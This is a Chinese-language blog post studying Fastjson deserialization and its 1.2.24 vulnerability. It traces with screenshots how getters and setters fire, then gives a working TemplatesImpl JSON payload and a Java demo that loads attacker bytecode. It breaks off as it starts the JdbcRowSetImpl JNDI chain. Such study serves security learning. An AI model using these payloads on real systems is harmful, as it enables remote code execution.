@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            Fastjson基础&amp;1.2.24反序列化学习 |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Fastjson基础&amp;1.2.24反序列化学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-06-06 22:50:30</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri Jun 27 2025 05:33:51 GMT+0800">2025-06-27 05:33:51</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>12 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="Fastjson基础-1-2-24反序列化学习"><a href="#Fastjson基础-1-2-24反序列化学习" class="headerlink" title="Fastjson基础&amp;1.2.24反序列化学习"></a>Fastjson基础&amp;1.2.24反序列化学习</h1><p>Fastjson 是阿里巴巴开源的一个Java语言编写的JSON处理器，用于将Java对象与JSON格式的字符串之间进行转换。简单来说，它能将Java对象序列化为JSON字符串，也能将JSON字符串反序列化为Java对象。</p>
+<p>其中主要有几个重要的函数，<code>JSON.parse</code>，<code>JSON.parseObject</code> 这俩个函数是用于反序列化的，<code>JSON.toJSONString</code>这个函数用于序列化对象</p>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>首先，创建一个类。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    public int Sex;</span><br><span class="line"></span><br><span class="line">    public Person() &#123;</span><br><span class="line">        System.out.println(&quot;Person constructor&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.println(&quot;Person.getName()&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;Person.setName()&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        System.out.println(&quot;Person.getAge()&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setSex(int Sex)&#123;</span><br><span class="line">        System.out.println(&quot;Person.setSex()&quot;);</span><br><span class="line">        this.Sex=Sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getSex()&#123;</span><br><span class="line">        System.out.println(&quot;Person.gerSex()&quot;);</span><br><span class="line">        return Sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将这个类进行json序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Person person = new Person();</span><br><span class="line">        person.setName(&quot;cat&quot;);</span><br><span class="line">        String jsonString = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749972495629-d1a3537e-7849-4578-b7fc-7a040379738f.png"></p>
+<p>可以看到调用了所有get方法之后，输出了json序列化之后的Java对象，再写一个将其反序列化的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line">public class Unserialize &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String jsonString = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Person\&quot;,\&quot;Sex\&quot;:1,\&quot;age\&quot;:10,\&quot;name\&quot;:\&quot;cat\&quot;,\&quot;sex\&quot;:1&#125;&quot;;</span><br><span class="line">        Person person = (Person) JSON.parse(jsonString);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        System.out.println(person.getClass().getName());</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Object person2 = JSON.parseObject(jsonString);</span><br><span class="line">        System.out.println(person2);</span><br><span class="line">        System.out.println(person2.getClass().getName());</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Object person3 = JSON.parseObject(jsonString, Person.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(person3);</span><br><span class="line">        System.out.println(person3.getClass().getName());</span><br><span class="line">        System.out.println(((Person) person3).getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749974615987-534a79a4-2c92-4903-94f1-49261a7ed525.png"></p>
+<p>因为使用了俩个不同的反序列化函数，因此有多段输出，从中可以发现<code>JSON.parse(jsonString)</code>在调用玩所以set方法后直接返Person类，而<code>JSON.parseObject(jsonString);</code>在调用了所以get与set方法之后都没有返回指定值，当第二个参数传入<code>Person.class</code>后<code>JSON.parseObject(jsonString, Person.class);</code>才返回Person类，因此当其序列化时会调用目标的所以get方法以及使用过的set方法，而反序列化时只调用所有的set方法，并且<code>parseObject</code>方法需要传入俩个参数才可以正常返回指定Java对象。</p>
+<p>并且，可以看到图片中的第二段参数，age并没有被赋值，这是由于其没有set方法，并且为private对象导致的，如果真的需要调用的化需要在后面再加上<code>Feature.SupportNonPublicField</code>参数。</p>
+<h2 id="反序列化调用setter-getter方法原理"><a href="#反序列化调用setter-getter方法原理" class="headerlink" title="反序列化调用setter&#x2F;getter方法原理"></a>反序列化调用setter&#x2F;getter方法原理</h2><p>可以看到上面的Demo中fastJson对Person类中的getter和setter方法进行了调用操作，因此如果在getter和setter方法中存在可以利用的恶意类并且被fastJson调用了就会进行执行。</p>
+<p>这里在Person中添加一个<code>Properties</code> 对象，这是一个嵌套对象，因此在反序列化的时候将会调用<code>getProperties()</code> 来获取已有实例，并且在<code>getProperties()</code>中加入<code>Runtime</code>方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    private int Sex;</span><br><span class="line">    private Properties properties;</span><br><span class="line"></span><br><span class="line">    public Person() &#123;</span><br><span class="line">        System.out.println(&quot;Person constructor&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        System.out.println(&quot;Person.getName()&quot;);</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        System.out.println(&quot;Person.setName()&quot;);</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public int getAge() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Person.getAge()&quot;);</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setSex(int Sex)&#123;</span><br><span class="line">        System.out.println(&quot;Person.setSex()&quot;);</span><br><span class="line">        this.Sex=Sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getSex() throws Exception &#123;</span><br><span class="line">        System.out.println(&quot;Person.gerSex()&quot;);</span><br><span class="line">        return Sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public Properties getProperties() throws Exception&#123;</span><br><span class="line">        System.out.println(&quot;getProperties&quot;);</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        return properties;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749977873538-3632e089-4eec-4d45-878d-8ea97f7dfe18.png"></p>
+<p>然后再对其进行反序列化操作(和上面Demo中基本一致)。</p>
+<h3 id="setter方法"><a href="#setter方法" class="headerlink" title="setter方法"></a>setter方法</h3><p>首先进入<code>Json.parse</code>方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749977966123-2f6e2c52-e954-4333-ad48-dd410890833d.png"></p>
+<p>一直过到<code>parser.parse</code>然后步入。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978035852-e2cbffd9-86f4-498d-82e8-8ca2ebc8fea0.png"></p>
+<p>继续跟进到<code>this.parse</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978075884-a239a580-c915-4e08-97c7-097c4963c7c8.png"></p>
+<p>这里是根据传入类型对其进行不同的处理，这里会跳转到12，也就是Object对象类型。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978246193-2bb91c30-e059-45d9-aeae-2066f59f5eed.png"></p>
+<p>这里继续跟进到<code>this.parseObject</code>中，然后一直跳到<code>deserializer.deserialze</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978399618-3c9ee4d9-cd16-4d5d-b517-cb0213a05cb9.png"></p>
+<p>跟进，然后再跟进。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978452231-84ce41dd-7e81-48af-b1d6-478eaebba8d3.png"></p>
+<p>跟进俩次就到了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978504386-b72aca4d-43f6-4566-bbdd-c0592785ae8b.png"></p>
+<p>这里是进行反序列化处理的，还是继续向下跟，可以跟到下面这个key的判断这里。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978591243-b9807dab-ce09-4423-9ccc-d01d9c4c6d85.png"></p>
+<p>继续向下跟进就行，然后可以调到<code>this.createInstance</code>反序列化之后的函数是在这里进行构造的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749978791289-12dca965-4adb-4a5c-ab78-c4b3d52a4e2e.png"></p>
+<p>可以观察到旁边的参数，是name，这个参数是接下来用于判断调用哪个参数的set方法用的，先继续向下跟进。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979099601-fe38d0de-14e5-4373-952c-b277f8e00b48.png"></p>
+<p>跟到<code>fieldDeserializer).parseField</code>这里，这个方法就是用来调用setter和getter方法的，跟进去。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979244440-50d360eb-d727-49b5-bbe9-913cbc2fc6a7.png"></p>
+<p>走到setValue这里。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979303630-a043958e-76a5-462a-8824-e0d6e6411057.png"></p>
+<p>继续跟进去。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979346262-75156e4d-080f-4eaf-bf56-b2d221918bd9.png"></p>
+<p>进入setValue之后，可以发现这就是一个根据反射来设置对象值的一段代码，往下面看可以看到invoke方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979525975-efed8319-a605-47d1-8cf5-de8bb9f44cbc.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979552066-ce893599-a114-4b60-aa6e-f647240cdc91.png"></p>
+<h3 id="Properties的getter方法"><a href="#Properties的getter方法" class="headerlink" title="Properties的getter方法"></a>Properties的getter方法</h3><p>就是通过这些invoke方法来执行setter&#x2F;getter方法的，继续跟，直到key&#x3D;properties。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979672407-585b140a-5fb6-47cc-aff4-bf11661bd493.png"></p>
+<p>他和前面参数都不一样，他是调用get方法，会到另一个<code>method.invoke</code>中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979747530-6c2d8573-bea2-400f-bb83-a5f4a71c2f14.png"></p>
+<p>执行后弹出计算器。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1749979771057-11cad65c-2f5f-4a2a-ae34-d6680d416f45.png"></p>
+<h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><p>上面分析了fastjson是通过调用<code>getter</code>和<code>setter</code>来进行序列化和反序列化操作的，因此只需要找到可以利用的<code>getter</code>和<code>setter</code>类就可以进行恶意操作。</p>
+<p>这里找到的是<code>TemplatesImpl</code>这个类加载字节码，他是通过<code>.newInstance()</code>方法触发的，可以找到这个<code>getTransletInstance()</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750413332824-9c0ae1d4-eef7-4d58-b711-985196a29239.png"></p>
+<p>这是一个getter方法，并且其中<code>__class</code>中的<code>_transletIndex</code>的里的类会使用<code>newInstance</code>进行实例化。</p>
+<p>这里可以需要让他走到<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>可以参考CC3设置的参数，也就是<code>_bytecodes</code>，<code>_name</code>和<code>_tfactory</code>不能为空。除此之外还有满足fastjson调用getter和setter的一些硬性要求。</p>
+<p>满足条件的setter：</p>
+<ul>
+<li>非静态函数</li>
+<li>返回类型为void或当前类</li>
+<li>参数个数为1个</li>
+</ul>
+<p>满足条件的getter：</p>
+<ul>
+<li>非静态方法</li>
+<li>无参数</li>
+<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
+</ul>
+<p>而这个<code>getTransletInstance()</code>方法是不满足这些条件的，因此我们需要找到一个可以调用<code>getTransletInstance()</code>方法的函数，向上寻找。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750421920443-7fadd5bb-7e6f-43fa-86b7-f3620981a200.png"></p>
+<p>找到newTransformer里面调用了该方法，并且看到其还传了一个参数，就是<code>_outputProperties</code>因此需要满足该参数也不为空才能满足调用条件。</p>
+<p>但由于其不是getter和setter方法，因此继续向上寻找，最后找到了<code>getOutputProperties</code>函数调用了<code>newTransformer</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750422112928-81193072-eeb7-4283-95ab-59a603288e82.png"></p>
+<p>因此可以构造序列化参数为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+ base+&quot;\&quot;],&#x27;_name&#x27;:&#x27;cat.a&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        String base = binToBase64(&quot;E://Test.class&quot;);</span><br><span class="line">        String fastJ = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+ base+&quot;\&quot;],&#x27;_name&#x27;:&#x27;cat.a&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&#125;&quot;;</span><br><span class="line">        JSON.parse(fastJ,Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String binToBase64(String filePath) throws IOException &#123;</span><br><span class="line">        byte[] fileContent = Files.readAllBytes(Paths.get(filePath)); // 读取文件内容</span><br><span class="line">        return Base64.getEncoder().encodeToString(fileContent); // 转换为Base64字符串</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><p>这条链就比较简单，主要是通过JNDI进行注入，利用的是setter方法。</p>
+<p>还是先看到<code>JdbcRowSetImpl</code>这个类，找到其中的<code>setDataSourceName</code>方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750426555444-d07d81b6-a1d9-4156-9bc0-d1da04960855.png"></p>
+<p>跟到<code>setDataSourceName</code>中，其中会设置<code>dataSource</code>的值</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750426866676-5281d47f-0f28-4646-b8f5-06dc086c773d.png"></p>
+<p>而触发点是在<code>setAutoCommit</code>方法中</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750426950062-d3d95f26-9673-4d59-91d2-1e24c242775b.png"></p>
+<p>当conn&#x3D;null时，将会直接触发connect方法</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750426984558-e12f12f6-f91f-4aad-92f3-ab1efe262652.png"></p>
+<p>在connect方法中进行了调用了lookup，并且调用的是<code>getDataSourceName</code>来获取值，由于setter方法在反序列化时自动调用，因此只需要给<code>dataSourceName</code>赋值即可，并且需要添加<code>autoCommit</code>参数，来触发<code>setAutoCommit</code>方法。</p>
+<p>因此构造payload为</p>
